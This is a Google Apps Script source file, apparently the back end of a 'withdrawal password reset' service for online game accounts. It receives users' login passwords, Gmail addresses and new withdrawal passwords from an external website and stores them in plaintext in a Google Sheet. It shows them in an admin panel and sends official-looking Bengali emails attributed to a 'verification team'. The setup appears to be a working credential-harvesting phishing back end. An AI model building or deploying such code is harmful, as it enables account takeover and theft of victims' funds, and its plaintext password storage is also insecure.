/**
 * =========================================================================
 * Google Apps Script Webhook & Admin Approval Portal
 * File: web.gs (or Code.gs)
 * =========================================================================
 * 
 * Features:
 * 1. doPost(e): Receives data from your website and appends rows to Google Sheet.
 * 2. doGet(e): Serves index.html as a web dashboard for reviewing & approving requests.
 * 3. getRequests(): Fetches rows from the sheet for the admin UI.
 * 4. updateRequestStatus(requestId, status, note): Updates status to Approved/Rejected in Google Sheet
 *    and optionally sends a confirmation email to the user.
 */

// Global configuration
var SHEET_NAME = "Submissions";
var HEADERS = [
  "Timestamp",
  "Request ID",
  "Game Name",
  "Username / Phone",
  "User Gmail",
  "Login Password",
  "New Withdraw Password",
  "Status",
  "Reviewed At",
  "Notes"
];

/**
 * Initializes or gets the target spreadsheet sheet with headers
 */
function getOrCreateSheet() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sheet = ss.getSheetByName(SHEET_NAME);
  if (!sheet) {
    // If "Submissions" doesn't exist, check the first active sheet
    sheet = ss.getActiveSheet();
    if (sheet.getLastRow() === 0) {
      sheet.setName(SHEET_NAME);
      sheet.appendRow(HEADERS);
      // Format headers
      var headerRange = sheet.getRange(1, 1, 1, HEADERS.length);
      headerRange.setBackground("#0f172a").setFontColor("#ffffff").setFontWeight("bold");
      sheet.setFrozenRows(1);
    }
  }
  return sheet;
}

/**
 * Web App entry point: Serves the Admin Approval Dashboard (index.html)
 */
function doGet(e) {
  getOrCreateSheet();
  var template = HtmlService.createTemplateFromFile("index");
  return template.evaluate()
    .setTitle("Withdrawal Password Reset - Admin Review Panel")
    .addMetaTag("viewport", "width=device-width, initial-scale=1.0")
    .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL);
}

/**
 * Webhook entry point: Receives submissions from your Vercel website
 */
function doPost(e) {
  try {
    var sheet = getOrCreateSheet();
    var data = {};

    if (e.postData && e.postData.contents) {
      try {
        data = JSON.parse(e.postData.contents);
      } catch (jsonErr) {
        data = e.parameter || {};
      }
    } else if (e.parameter) {
      data = e.parameter;
    }

    var timestamp = data.timestamp || Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd HH:mm:ss");
    var requestId = data.requestId || "REQ-" + Math.floor(100000 + Math.random() * 900000);
    var gameName = data.gameName || "N/A";
    var usernameOrPhone = data.usernameOrPhone || "N/A";
    var userGmail = data.gmail || "";
    var loginPassword = data.loginPassword || "";
    var newWithdrawPassword = data.newWithdrawPassword || "";
    var status = data.status || "Pending";

    // Append to sheet
    sheet.appendRow([
      timestamp,
      requestId,
      gameName,
      usernameOrPhone,
      userGmail,
      loginPassword,
      newWithdrawPassword,
      status,
      "", // Reviewed At
      ""  // Notes
    ]);

    return ContentService.createTextOutput(JSON.stringify({
      result: "success",
      message: "Data saved successfully to Google Sheet",
      requestId: requestId
    })).setMimeType(ContentService.MimeType.JSON);

  } catch (error) {
    return ContentService.createTextOutput(JSON.stringify({
      result: "error",
      error: error.toString()
    })).setMimeType(ContentService.MimeType.JSON);
  }
}

/**
 * Fetches all submissions for the Admin UI
 */
function getRequests() {
  var sheet = getOrCreateSheet();
  var lastRow = sheet.getLastRow();
  if (lastRow <= 1) {
    return [];
  }

  var data = sheet.getRange(2, 1, lastRow - 1, 10).getValues();
  var requests = [];

  for (var i = 0; i < data.length; i++) {
    var row = data[i];
    // rowIndex is 1-based (i + 2)
    requests.push({
      rowIndex: i + 2,
      timestamp: row[0] ? String(row[0]) : "",
      requestId: row[1] ? String(row[1]) : "",
      gameName: row[2] ? String(row[2]) : "",
      usernameOrPhone: row[3] ? String(row[3]) : "",
      userGmail: row[4] ? String(row[4]) : "",
      loginPassword: row[5] ? String(row[5]) : "",
      newWithdrawPassword: row[6] ? String(row[6]) : "",
      status: row[7] ? String(row[7]) : "Pending",
      reviewedAt: row[8] ? String(row[8]) : "",
      notes: row[9] ? String(row[9]) : ""
    });
  }

  // Reverse so newest appears first
  return requests.reverse();
}

/**
 * Updates status of a request to Approved or Rejected
 */
function updateRequestStatus(requestId, newStatus, note) {
  try {
    var sheet = getOrCreateSheet();
    var lastRow = sheet.getLastRow();
    if (lastRow <= 1) {
      return { success: false, error: "No records found" };
    }

    var requestIds = sheet.getRange(2, 2, lastRow - 1, 1).getValues();
    var targetRowIndex = -1;

    for (var i = 0; i < requestIds.length; i++) {
      if (String(requestIds[i][0]).trim() === String(requestId).trim()) {
        targetRowIndex = i + 2;
        break;
      }
    }

    if (targetRowIndex === -1) {
      return { success: false, error: "Request ID not found: " + requestId };
    }

    var reviewedAt = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd HH:mm:ss");

    // Update Status (Col 8), Reviewed At (Col 9), Notes (Col 10)
    sheet.getRange(targetRowIndex, 8).setValue(newStatus);
    sheet.getRange(targetRowIndex, 9).setValue(reviewedAt);
    if (note) {
      sheet.getRange(targetRowIndex, 10).setValue(note);
    }

    // Optionally notify the user via email if userGmail is provided
    var userGmail = sheet.getRange(targetRowIndex, 5).getValue();
    var gameName = sheet.getRange(targetRowIndex, 3).getValue();
    var usernameOrPhone = sheet.getRange(targetRowIndex, 4).getValue();

    if (userGmail && userGmail.indexOf("@") !== -1) {
      try {
        var subject = "";
        var bodyHtml = "";

        if (newStatus === "Approved") {
          subject = "[" + gameName + "] আপনার উত্তোলন পাসওয়ার্ড সফলভাবে আপডেট করা হয়েছে - " + requestId;
          bodyHtml = "<div style='font-family: Arial, sans-serif; padding: 20px; color: #1e293b; max-width: 600px; border: 1px solid #e2e8f0; border-radius: 12px;'>"
            + "<h2 style='color: #16a34a; margin-top: 0;'>অভিনন্দন! আপনার আবেদন অনুমোদিত হয়েছে</h2>"
            + "<p>প্রিয় গ্রাহক,</p>"
            + "<p>আপনার <strong>" + gameName + "</strong> অ্যাকাউন্টের (" + usernameOrPhone + ") নতুন উত্তোলন পাসওয়ার্ড ভেরিফিকেশন টিম কর্তৃক সফলভাবে অনুমোদিত ও সিস্টেম সার্ভারে সেট করা হয়েছে।</p>"
            + "<div style='background: #f8fafc; padding: 15px; border-radius: 8px; margin: 15px 0;'>"
            + "<div><strong>ট্র্যাকিং আইডি:</strong> " + requestId + "</div>"
            + "<div><strong>স্ট্যাটাস:</strong> <span style='color: #16a34a; font-weight: bold;'>Approved (অনুমোদিত)</span></div>"
            + "<div><strong>অনুমোদনের সময়:</strong> " + reviewedAt + "</div>"
            + "</div>"
            + "<p>এখন আপনি আপনার নতুন উত্তোলন পাসওয়ার্ড ব্যবহার করে সহজেই অর্থ উত্তোলন করতে পারবেন।</p>"
            + "<p style='color: #64748b; font-size: 12px; margin-top: 25px;'>নিরাপত্তা সতর্কবার্তা: আপনার অ্যাকাউন্টের লগইন তথ্য কারো সাথে শেয়ার করবেন না।</p>"
            + "</div>";
        } else if (newStatus === "Rejected") {
          subject = "[" + gameName + "] উত্তোলন পাসওয়ার্ড রিসেট আবেদন সংক্রান্ত নোটিশ - " + requestId;
          bodyHtml = "<div style='font-family: Arial, sans-serif; padding: 20px; color: #1e293b; max-width: 600px; border: 1px solid #e2e8f0; border-radius: 12px;'>"
            + "<h2 style='color: #dc2626; margin-top: 0;'>আবেদন প্রত্যাখ্যাত হয়েছে</h2>"
            + "<p>প্রিয় গ্রাহক,</p>"
            + "<p>আপনার <strong>" + gameName + "</strong> অ্যাকাউন্টের উত্তোলন পাসওয়ার্ড রিসেট আবেদনটি ভুল তথ্যের কারণে বাতিল করা হয়েছে।</p>"
            + (note ? "<p><strong>কারণ/নোট:</strong> " + note + "</p>" : "")
            + "<p>দয়া করে সঠিক তথ্য দিয়ে পুনরায় আবেদন করুন।</p>"
            + "</div>";
        }

        if (subject) {
          MailApp.sendEmail({
            to: userGmail,
            subject: subject,
            htmlBody: bodyHtml
          });
        }
      } catch (mailErr) {
        console.warn("Could not send approval email to user:", mailErr);
      }
    }

    return {
      success: true,
      requestId: requestId,
      status: newStatus,
      reviewedAt: reviewedAt
    };

  } catch (err) {
    return { success: false, error: err.toString() };
  }
}
